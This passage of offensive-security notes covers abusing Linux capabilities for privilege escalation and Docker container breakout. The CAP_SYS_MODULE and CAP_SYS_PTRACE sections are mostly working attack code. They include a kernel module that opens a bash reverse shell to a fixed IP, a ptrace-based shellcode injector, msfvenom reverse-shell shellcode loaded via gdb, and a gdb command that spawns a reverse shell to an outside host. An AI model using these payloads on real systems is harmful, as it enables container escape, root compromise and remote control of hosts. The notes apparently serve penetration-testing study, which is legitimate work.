[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) not only allows the execution of the `reboot(2)` system call for system restarts, including specific commands like `LINUX_REBOOT_CMD_RESTART2` tailored for certain hardware platforms, but it also enables the use of `kexec_load(2)` and, from Linux 3.17 onwards, `kexec_file_load(2)` for loading new or signed crash kernels respectively.

<!-- }}} -->

<!-- CAP_SYS_CHROOT {{{-->
### CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables the execution of the `chroot(2)` system call, which can potentially allow for the escape from `chroot(2)` environments through known vulnerabilities:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

<!-- }}} -->

<!-- CAP_SYS_MODULE {{{-->
### CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** empowers a process to **load and unload kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls)**, offering direct access to the kernel's core operations. This capability presents critical security risks, as it enables privilege escalation and total system compromise by allowing modifications to the kernel, thereby bypassing all Linux security mechanisms, including Linux Security Modules and container isolation.
**This means that you can** **insert/remove kernel modules in/from the kernel of the host machine.**

**Example with binary**

In the following example the binary **`python`** has this capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

By default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname -r)`**.\
In order to abuse this, lets create a fake **lib/modules** folder:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Then **compile the kernel module you can find 2 examples below and copy** it to this folder:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Finally, execute the needed python code to load this kernel module:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Example 2 with binary**

In the following example the binary **`kmod`** has this capability.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Which means that it's possible to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing this privilege.

**Example with environment (Docker breakout)**

You can check the enabled capabilities inside the docker container using:

<!-- Example {{{-->
> [!example]-
>
> ```bash
> capsh --print
> Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
> Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
> Securebits: 00/0x0/1'b0
>  secure-noroot: no (unlocked)
>  secure-no-suid-fixup: no (unlocked)
>  secure-keep-caps: no (unlocked)
> uid=0(root)
> gid=0(root)
> groups=0(root)
> ```
<!-- }}} -->

Inside the previous output you can see that the **SYS_MODULE** capability is enabled.

**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:

<!-- Example {{{-->
> [!example]-
>
> ```c
> #include <linux/kmod.h>
> #include <linux/module.h>
> MODULE_LICENSE("GPL");
> MODULE_AUTHOR("AttackDefense");
> MODULE_DESCRIPTION("LKM reverse shell module");
> MODULE_VERSION("1.0");
>
> char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
> static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
>
> // call_usermodehelper function is used to create user mode processes from kernel space
> static int __init reverse_shell_init(void) {
>     return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
> }
>
> static void __exit reverse_shell_exit(void) {
>     printk(KERN_INFO "Exiting\n");
> }
>
> module_init(reverse_shell_init);
> module_exit(reverse_shell_exit);
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```bash
> obj-m +=reverse-shell.o
>
> all:
>     make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
>
> clean:
>     make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
> ```
<!-- }}} -->

> [!WARNING]
> The blank char before each make word in the Makefile **must be a tab, not spaces**!

Execute `make` to compile it.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**The code of this technique was copied from the laboratory of "Abusing SYS_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Another example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

<!-- }}} -->

<!-- CAP_SYS_RAWIO {{{-->
### CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to descriptively `perform a range of device-specific operations on other devices`.

This can be useful for **privilege escalation** and **Docker breakout.**

<!-- }}} -->

<!-- CAP_SYS_PTRACE {{{-->
### CAP_SYS_PTRACE

[CAP_SYS_PTRACE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to escape the container
by injecting a shellcode inside some process
running inside the host

To access processes running inside the host
the container needs to be run at least with `--pid=host`

<!-- Info {{{-->
> [!info]-
>
> [CAP_SYS_PTRACE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
> grants the ability to use debugging and system call tracing functionalities
> provided by `ptrace(2)` and cross-memory attach calls
> like `process_vm_readv(2)` and `process_vm_writev(2)`.
>
> Although powerful for diagnostic and monitoring purposes,
> if `CAP_SYS_PTRACE` is enabled without restrictive measures
> like a seccomp filter on `ptrace(2)`,
> it can significantly undermine system security.
>
> Specifically, it can be exploited to circumvent other security restrictions,
> notably those imposed by seccomp,
> as demonstrated by
> [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53).
>
>
>
<!-- }}} -->

**Example with binary (python)**

<!-- Example {{{-->
> [!example]-
>
> [[Python/General|Python]]
> ```sh
>
> ```
<!-- }}} -->


```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

<!-- Example {{{-->
> [!example]-
>
> ```python
> import ctypes
> import sys
> import struct
> # Macros defined in <sys/ptrace.h>
> # https://code.woboq.org/qt5/include/sys/ptrace.h.html
> PTRACE_POKETEXT = 4
> PTRACE_GETREGS = 12
> PTRACE_SETREGS = 13
> PTRACE_ATTACH = 16
> PTRACE_DETACH = 17
> # Structure defined in <sys/user.h>
> # https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
> class user_regs_struct(ctypes.Structure):
>     _fields_ = [
>         ("r15", ctypes.c_ulonglong),
>         ("r14", ctypes.c_ulonglong),
>         ("r13", ctypes.c_ulonglong),
>         ("r12", ctypes.c_ulonglong),
>         ("rbp", ctypes.c_ulonglong),
>         ("rbx", ctypes.c_ulonglong),
>         ("r11", ctypes.c_ulonglong),
>         ("r10", ctypes.c_ulonglong),
>         ("r9", ctypes.c_ulonglong),
>         ("r8", ctypes.c_ulonglong),
>         ("rax", ctypes.c_ulonglong),
>         ("rcx", ctypes.c_ulonglong),
>         ("rdx", ctypes.c_ulonglong),
>         ("rsi", ctypes.c_ulonglong),
>         ("rdi", ctypes.c_ulonglong),
>         ("orig_rax", ctypes.c_ulonglong),
>         ("rip", ctypes.c_ulonglong),
>         ("cs", ctypes.c_ulonglong),
>         ("eflags", ctypes.c_ulonglong),
>         ("rsp", ctypes.c_ulonglong),
>         ("ss", ctypes.c_ulonglong),
>         ("fs_base", ctypes.c_ulonglong),
>         ("gs_base", ctypes.c_ulonglong),
>         ("ds", ctypes.c_ulonglong),
>         ("es", ctypes.c_ulonglong),
>         ("fs", ctypes.c_ulonglong),
>         ("gs", ctypes.c_ulonglong),
>     ]
>
> libc = ctypes.CDLL("libc.so.6")
>
> pid=int(sys.argv[1])
>
> # Define argument type and respone type.
> libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
> libc.ptrace.restype = ctypes.c_uint64
>
> # Attach to the process
> libc.ptrace(PTRACE_ATTACH, pid, None, None)
> registers=user_regs_struct()
>
> # Retrieve the value stored in registers
> libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
> print("Instruction Pointer: " + hex(registers.rip))
> print("Injecting Shellcode at: " + hex(registers.rip))
>
> # Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
> shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
>
> # Inject the shellcode into the running process byte by byte.
> for i in xrange(0,len(shellcode),4):
>     # Convert the byte to little endian.
>     shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
>     shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
>     shellcode_byte=int(shellcode_byte_little_endian,16)
>
>     # Inject the byte.
>     libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
>
> print("Shellcode Injected!!")
>
> # Modify the instuction pointer
> registers.rip=registers.rip+2
>
> # Set the registers
> libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
> print("Final Instruction Pointer: " + hex(registers.rip))
>
> # Detach from the process.
> libc.ptrace(PTRACE_DETACH, pid, None, None)
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> [gdb](https://en.wikipedia.org/wiki/GNU_Debugger)
> ` with `ptrace` capability:
>
> ```sh
> /usr/bin/gdb = cap_sys_ptrace+ep
> ```
>
> Create a shellcode with msfvenom to inject in memory via gdb
>
> <!-- Example {{{-->
> > [!example]-
> >
> > ```python
> > # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
> > buf =  b""
> > buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
> > buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
> > buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
> > buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
> > buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
> > buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
> > buf += b"\x0f\x05"
> >
> > # Divisible by 8
> > payload = b"\x90" * (-len(buf) % 8) + buf
> >
> > # Change endianess and print gdb lines to load the shellcode in RIP directly
> > for i in range(0, len(buf), 8):
> > 	chunk = payload[i:i+8][::-1]
> > 	chunks = "0x"
> > 	for byte in chunk:
> > 		chunks += f"{byte:02x}"
> >
> > 	print(f"set {{long}}($rip+{i}) = {chunks}")
> > ```
> <!-- }}} -->
>
> Debug a root process with gdb ad copy-paste the previously generated gdb lines:
>
> <!-- Example {{{-->
> > [!example]-
> >
> > ```bash
> > # Let's write the commands to a file
> > echo 'set {long}($rip+0) = 0x296a909090909090
> > set {long}($rip+8) = 0x5e016a5f026a9958
> > set {long}($rip+16) = 0x0002b9489748050f
> > set {long}($rip+24) = 0x48510b0e0a0a2923
> > set {long}($rip+32) = 0x582a6a5a106ae689
> > set {long}($rip+40) = 0xceff485e036a050f
> > set {long}($rip+48) = 0x6af675050f58216a
> > set {long}($rip+56) = 0x69622fbb4899583b
> > set {long}($rip+64) = 0x8948530068732f6e
> > set {long}($rip+72) = 0x050fe689485752e7
> > c' > commands.gdb
> > # In this case there was a sleep run by root
> > ## NOTE that the process you abuse will die after the shellcode
> > /usr/bin/gdb -p $(pgrep sleep)
> > [...]
> > (gdb) source commands.gdb
> > Continuing.
> > process 207009 is executing new program: /usr/bin/dash
> > [...]
> > ```
> <!-- }}} -->
>
<!-- }}} -->

**Example with environment (Docker breakout) - Another gdb Abuse**

If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).

> [!WARNING]
> If you get the error "No symbol "system" in current context." check the previous example loading a shellcode in a program via gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

You can check the enabled capabilities inside the docker container using:

<!-- Example {{{-->
> [!example]-
>
> ```bash
> capsh --print
> Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
> Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
> Securebits: 00/0x0/1'b0
>  secure-noroot: no (unlocked)
>  secure-no-suid-fixup: no (unlocked)
>  secure-keep-caps: no (unlocked)
> uid=0(root)
> gid=0(root)
> groups=0(root
> ```
<!-- }}} -->

List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

<!-- }}} -->

<!-- }}} -->
